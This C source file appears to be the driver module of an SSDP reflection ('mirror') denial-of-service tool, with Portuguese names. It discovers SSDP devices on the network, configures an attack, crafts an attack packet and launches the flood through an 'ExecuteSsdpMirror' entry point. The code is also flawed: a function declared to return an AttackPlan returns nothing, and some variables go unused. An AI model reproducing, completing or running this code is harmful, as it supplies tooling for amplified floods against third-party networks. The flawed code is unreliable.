

#include "ssdpLib.h"


AttackPlan createAttackSSDP(LhfDraft *draft){
    
    AttackPlan *newData;
    memalloc( (void *)&newData, sizeof( AttackPlan ) );


    listDispositivoSSDP* listaDispositivos;
	configuracaoAtaque* configuracao = NULL;
	pacoteAtaque* pckAttack = NULL;

    listaDispositivos = iniciaListDisp();

    printf("Modulo de pesquisa SSDP. \n");
	printf("------------------------------------------------\n");
    pesquisarDispositivosSSDP(listaDispositivos);
	printf("----------------------Fim Pesquisa-------------------\n");
	//mostrarDispositivosObtidos(listaDispositivos);

	/*----------------------------------------------------------------------*/
	printf("Modulo de ataque SSDP. \n");

	configuracao = configurarAttackSSDP(listaDispositivos);

	pckAttack = montaPacketAttackSSDP(configuracao);

	iniciaAtaqueSSDP(configuracao, pckAttack, 1);



}


// p_draft = argumentos que o ataque vai precisar.
int  ExecuteSsdpMirror( void *p_draft )
{
    AttackPlan *plan;
    LhfDraft *draft = (LhfDraft *)p_draft;

    createAttackSSDP(draft);

    return 0;
}
